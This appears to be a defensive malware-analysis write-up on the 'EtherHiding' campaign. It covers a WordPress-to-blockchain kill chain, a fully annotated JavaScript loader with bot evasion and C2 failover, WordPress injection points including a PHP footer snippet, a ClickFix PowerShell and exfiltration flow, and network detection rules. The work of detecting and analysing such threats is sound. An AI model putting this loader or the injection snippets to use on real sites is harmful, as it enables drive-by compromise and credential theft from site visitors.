# EtherHiding — Attack Patterns & Variant Detection

## Confirmed Kill Chain — Example EtherHiding Campaign

```
T+0s    Victim visits compromised WordPress site
         └── WP loads theme scripts including injected custom.js

T+2s    custom.js calls blockchain via BSC testnet RPC:
         POST https://bsc-testnet-rpc.publicnode.com (<RPC-SERVER-IP>)
         Body: {"method":"eth_call","params":[{"to":"<CONTRACT-ADDRESS>","data":"0x6d4ce63c"},"latest"]}

T+3s    Contract returns ABI-encoded Base64 JavaScript loader
         ABI decode → base64 decode → ~1500-char JavaScript

T+3s    Loader executes immediately (synchronous XHR, no user interaction):
         1. Checks bot UA → clean → continues
         2. Checks WP paths → not admin → continues
         3. Decodes C2 URLs (double-base64): <primary-c2-domain>/jsrepo
         4. Fires sync XHR to <primary-c2-domain>
         5. Injects response as <script> tag → eval equivalent

T+4s    Victim browser fetches 1–2MB obfuscated payload:
         GET https://<primary-c2-domain>/jsrepo?rnd=0.RANDOM&ts=UNIX_MS (<C2-SERVER-IP>)
         Response: 1M+ chars, javascript-obfuscator _0x pattern

T+4s    Payload executes:
         - Registers Service Worker for persistence
         - Starts JSONP polling to ClickFix C2 every 1 second
         - Displays ClickFix overlay when operator issues command

T+5s    ClickFix C2 polling begins:
         GET http://<clickfix-c2-domain>/index.php?callback=handleCmdCheck_TIMESTAMP&id=SESSION_ID (<CLICKFIX-IP>)
         Response: handleCmdCheck_TS({"executed":false});

When operator issues command:
         Response: handleCmdCheck_TS({"executed":true,"cmd":"powershell -enc BASE64"});
         Victim clicks overlay → runs PowerShell cradle → credentials dumped → POST /clickfix_exfil
```

---

## Blockchain Payload — Full Annotated Loader

```javascript
;!function(){try{
  // Stage 1: Collect fingerprint data
  var t=navigator.userAgent.toLowerCase(),        // UA string
      a=document.referrer.toLowerCase(),           // referrer
      r=window.location.href.toLowerCase();        // current URL

  // Stage 2: Bot / scanner evasion — exit silently if triggered
  if(/bot|crawl|slurp|spider|baidu|ahrefs|mj12bot|semrush|screaming|
      sitefinity|dotbot|sistrix|gigabot|lipperhey|blexbot|brandwatch|
      monitor|pingdom|gtmetrix|pagespeed|lighthouse|headlesschrome|
      phantomjs|curl|wget|python|java/i.test(t)
    ||-1!==a.indexOf("/wp-json")
    ||/wp-login\.php|wp-admin|wp-includes|
       xmlrpc|wp-json|wp-signup|robots\.txt|
       \.well-known|sitemap\.xml/i.test(r))
    return;   // ← silently exits for bots/crawlers/admin paths

  // Stage 3: C2 URLs — double base64 encoded
  // Primary + 2 fallbacks (the two backups are identical in this sample)
  var n=[
    "<BASE64_PRIMARY_C2_URL>",    // → https://<primary-c2-domain>/jsrepo?rnd=
    "<BASE64_BACKUP_C2_URL>",     // → https://<backup-c2-domain>/jsrepo?rnd= (fallback)
    "<BASE64_BACKUP_C2_URL>"      // → https://<backup-c2-domain>/jsrepo?rnd= (duplicate)
  ];

  // Stage 4: Try C2 URLs in order, fail-over on error or non-2xx
  !function e(t){
    if(!(t>=n.length))
    try{
      // Build URL: decode base64 + append cache-busting params
      var a=base64decode(n[t])+Math.random()+"&ts="+Date.now();

      // Synchronous XHR — blocks page rendering, guaranteed execution
      var r=new XMLHttpRequest;
      r.open("GET",a,!1);    // !1 = false = SYNCHRONOUS
      r.send(null);

      if(r.status>=200&&r.status<300){
        // Stage 5: Eval via script tag injection
        var c=document.createElement("script");
        c.text=r.responseText.trim();
        document.head.appendChild(c);   // ← equivalent to eval()
      } else {
        e(t+1)  // try next fallback URL
      }
    }catch(o){e(t+1)}
  }(0)

}catch(c){}}();
```

---

## Variant Detection — What Changes Between Campaigns

| Component | Typical Values | What to Look For |
|---|---|---|
| Network | BSC testnet, ETH mainnet, Base Sepolia, Polygon | Any testnet or mainnet |
| RPC | publicnode.com, infura.io, cloudflare-eth.com, alchemy.com | Any blockchain RPC domain |
| Contract | 40-char hex contract address | `0x[a-fA-F0-9]{40}` pattern |
| Function | `0x6d4ce63c` (get()), `0x2e64cec1` (retrieve()) | Any 4-byte getter selector |
| Primary C2 | Short, random-looking domain | `/jsrepo?rnd=` path pattern |
| Backup C2 | Similar to primary, often a variant | Same domain pattern as primary |
| ClickFix C2 | Business-sounding recent domain | `handleCmdCheck_` callback |
| Payload size | 1–2MB typical | Over 500KB JS from unknown domain |
| Obfuscator | javascript-obfuscator | `_0x` variable naming |

**Constant indicators across ALL variants:**
1. `eth_call` from a browser (not a DeFi app)
2. `atob()` followed by XHR to external domain
3. Synchronous XHR: `.open("GET", url, false)` or `.open("GET", url, !1)`
4. Script tag injection of XHR response text
5. JSONP polling with `handleCmdCheck_` callback naming

---

## WordPress Injection Points

The injector script is typically placed in one of these locations:

1. **Child theme `custom.js`** — `/wp-content/themes/THEME_NAME/js/custom.js`
   - Most common — easy to modify via FTP/SFTP if credentials compromised
   - Hard to notice — `custom.js` is a legitimate, expected file

2. **RevSlider plugin JS** — if RevSlider is installed
   - Historical target: RevSlider < 4.2 had arbitrary file upload (CVE-2014-9734)
   - Inject into slider JS files or plugin's own JS

3. **wp_footer hook injection via `functions.php`**
   - `add_action('wp_footer', function(){ echo '<script>...INJECTED...</script>'; });`
   - Check all `functions.php` in active theme and child theme

4. **Database injection via `wp_options`** — `wp_head` or `wp_footer` options
   - Check: `SELECT option_value FROM wp_options WHERE option_name='wp_head' OR option_name='wp_footer';`

5. **Plugin file modification** — any third-party plugin's main .js file

**Detection in page_source.html:**
- Scripts loaded from WP theme paths containing blockchain patterns
- Inline `<script>` blocks with `eth_call` or `atob(` content
- External `<script src="">` to non-CDN, non-plugin domains

---

## Infrastructure Patterns

**C2 Payload Server (jsrepo):**
- Domain pattern: short, random-looking, recently registered, no legitimate web presence
- Path: `/jsrepo` with mandatory cache-busting `?rnd=FLOAT&ts=UNIX_MS`
- MIME type: `application/javascript` or `text/javascript`
- Response size: 1–2MB of obfuscated JavaScript
- Hosting: typically budget VPS, Russian/Eastern European ASNs common
- No robots.txt, no SSL cert match, no legitimate website content

**ClickFix C2:**
- Domain pattern: business-sounding, recently registered — often year-suffix pattern (e.g. `*2026.com`)
- Path: `/index.php` with JSONP callback
- Pattern: `?callback=handleCmdCheck_TIMESTAMP&id=SESSION_ID`
- Session ID format: `UNIX_MS-RANDOM_STRING` e.g. `1782098667610-0u94isda`
- Poll interval: ~1 second
- Response format: valid JSONP — `CALLBACK({"executed":bool,"cmd":"..."});`

**Blockchain Contract:**
- Deployed on free/cheap testnets (BSC testnet = free testBNB)
- Single public getter function — no authentication required
- State updated when operator wants to change the payload URL
- Contract state persists — call it manually to see current payload anytime

---

## Detection Rules (Network)

```
# EtherHiding Stage 2 — Blockchain Dead Drop
HTTP POST to *.publicnode.com | *.infura.io | cloudflare-eth.com | *.alchemy.com | *.ankr.com
  WHERE body CONTAINS "eth_call"
  WHERE source IS NOT known DeFi/crypto application
→ ALERT HIGH: Blockchain RPC from unexpected source

# EtherHiding Stage 4 — jsrepo Payload Delivery
HTTP GET matching path pattern /jsrepo?rnd=*&ts=*
  WHERE response size > 500KB
  WHERE content-type = application/javascript
→ ALERT HIGH: EtherHiding jsrepo payload delivery

# EtherHiding Stage 5/6 — ClickFix C2 Polling
HTTP GET matching path pattern /index.php?callback=handleCmdCheck_*&id=*
→ ALERT HIGH: ClickFix C2 polling — active campaign

# General — Service Worker from non-app domain
navigator.serviceWorker.register() on non-first-party domain
→ ALERT MEDIUM: Suspicious Service Worker registration
```

**Common Blockchain RPC Endpoints — Set to ALERT, NOT BLOCK:**

| Endpoint | Network |
|---|---|
| bsc-testnet-rpc.publicnode.com | BSC testnet |
| cloudflare-eth.com | Ethereum mainnet |
| mainnet.infura.io | Ethereum mainnet |
| rpc.ankr.com/eth | Ethereum mainnet |
| polygon-rpc.com | Polygon |
| api.avax.network/ext/bc/C/rpc | Avalanche |
| base-sepolia.publicnode.com | Base Sepolia |
